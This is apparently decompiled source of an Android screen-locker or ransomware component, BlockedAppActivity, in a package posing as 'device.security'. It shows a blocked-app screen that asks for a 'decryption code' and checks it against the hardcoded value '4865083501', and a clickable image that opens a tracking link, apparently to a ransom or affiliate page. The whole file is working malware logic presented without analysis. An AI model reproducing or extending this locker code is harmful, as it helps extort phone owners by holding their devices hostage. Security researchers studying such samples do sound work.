package com.device.security.activities;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.device.security.R;
import com.device.security.util.SharedPreferencesUtil;
import com.device.security.util.Util;
import java.util.List;
import java.util.Objects;

public class BlockedAppActivity extends AppCompatActivity {
    private EditText secretPin;

    /* Access modifiers changed, original: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_blocked_app);
        this.secretPin = (EditText) findViewById(R.id.secret_pin);
        findViewById(R.id.verify_pin).setOnClickListener(new -$$Lambda$BlockedAppActivity$D8OfY7RdDS9LRLLG1pSplE6SLAU(this));
        this.secretPin.setOnKeyListener(new -$$Lambda$BlockedAppActivity$ieiDy6OeJ0a9p4tNBYtAVQhpnZI(this));
        findViewById(R.id.image_with_link).setOnClickListener(new -$$Lambda$BlockedAppActivity$YUPzVe2WpQ2_h6WIHd5rV-8xkdY(this));
    }

    public /* synthetic */ void lambda$onCreate$0$BlockedAppActivity(View view) {
        verifyPin();
    }

    public /* synthetic */ boolean lambda$onCreate$1$BlockedAppActivity(View view, int i, KeyEvent keyEvent) {
        if (keyEvent.getAction() != 0 || i != 66) {
            return false;
        }
        hideSoftKeyboard(this);
        verifyPin();
        return true;
    }

    public /* synthetic */ void lambda$onCreate$2$BlockedAppActivity(View view) {
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("https://qmjy6.bemobtracks.com/go/4286a004-62c6-43fb-a614-d90b58f133e5"));
        intent.addFlags(268435456);
        List allBrowsersList = Util.getAllBrowsersList(this);
        if (allBrowsersList.size() > 0) {
            try {
                intent.setPackage((String) allBrowsersList.get(0));
                startActivity(intent);
                return;
            } catch (ActivityNotFoundException e) {
                e.printStackTrace();
                return;
            }
        }
        Toast.makeText(this, "No Browser App Found", 1).show();
    }

    private void hideSoftKeyboard(Activity activity) {
        ((InputMethodManager) Objects.requireNonNull((InputMethodManager) activity.getSystemService("input_method"))).hideSoftInputFromWindow(((View) Objects.requireNonNull(activity.getCurrentFocus())).getWindowToken(), 0);
    }

    private void verifyPin() {
        String trim = this.secretPin.getText().toString().trim();
        if (TextUtils.isEmpty(trim)) {
            Toast.makeText(this, "enter decryption code", 0).show();
        }
        if (trim.equals("4865083501")) {
            SharedPreferencesUtil.setAuthorizedUser(this, "1");
            Toast.makeText(this, "Congrats. You Phone is Decrypted", 0).show();
            finish();
            return;
        }
        Toast.makeText(this, "Failed, Decryption Code is Incorrect", 0).show();
    }
}
